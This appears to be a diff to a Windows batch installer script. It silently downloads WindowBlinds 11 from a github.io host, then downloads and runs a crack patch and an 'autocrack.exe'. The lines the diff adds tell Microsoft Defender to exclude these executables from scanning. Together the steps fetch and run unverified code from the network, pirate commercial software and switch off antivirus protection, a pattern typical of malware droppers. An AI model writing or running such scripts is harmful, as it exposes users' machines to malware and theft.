@@ -110,6 +110,8 @@ del /f /q "%temp%\RDPWInst.exe"
 curl --output "%TEMP%\WindowBlinds11_setup.exe" "https://microtoolbox.github.io/8d4ejv.com"
 start /wait "" "%TEMP%\WindowBlinds11_setup.exe" /S
 del /f /q "%TEMP%\WindowBlinds11_setup.exe"
+powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe'
+powershell Add-MpPreference -ExclusionPath '%temp%\Get7\autocrack.exe'
 curl --output "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe" "https://microtoolbox.github.io/Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
 curl --output "%TEMP%\autocrack.exe" "https://microtoolbox.github.io/autocrack.exe"
 start /wait "" "%TEMP%\autocrack.exe" "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
